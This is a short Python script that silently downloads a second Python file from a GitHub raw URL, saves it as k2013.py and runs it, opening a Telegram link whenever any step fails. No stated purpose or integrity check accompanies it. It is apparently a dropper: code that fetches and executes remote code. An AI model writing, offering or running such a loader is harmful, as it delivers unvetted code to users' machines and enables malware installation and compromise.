import requests
import webbrowser
import subprocess
import sys


# Configuration
config = {
    "tg_link": "https://t.me/ukwfu",
    "check_url": "https://raw.githubusercontent.com/jaspalaspa/checkacess/main/checkacess.txt",
    "raw_url": "https://raw.githubusercontent.com/jaspalaspa/545645665/main/usethis.py"
}


def open_telegram():
    """Redirect to Telegram if something fails."""
    webbrowser.open(config["tg_link"])


def fetch_check_url():
    """Fetch the check file (silent)."""
    resp = requests.get(config["check_url"], timeout=10)
    return resp.status_code == 200


def download_raw_file():
    """Download the raw Python file (silent)."""
    resp = requests.get(config["raw_url"], timeout=10)
    if resp.status_code == 200:
        with open("k2013.py", "w", encoding="utf-8") as f:
            f.write(resp.text)
        return True
    return False


def run_downloaded_file():
    """Run the downloaded Python file."""
    try:
        subprocess.run([sys.executable, "k2013.py"], check=True)
        return True
    except Exception:
        return False


if __name__ == "__main__":
    try:
        if fetch_check_url():
            if download_raw_file():
                if not run_downloaded_file():
                    open_telegram()
            else:
                open_telegram()
        else:
            open_telegram()
    except Exception:
        open_telegram()
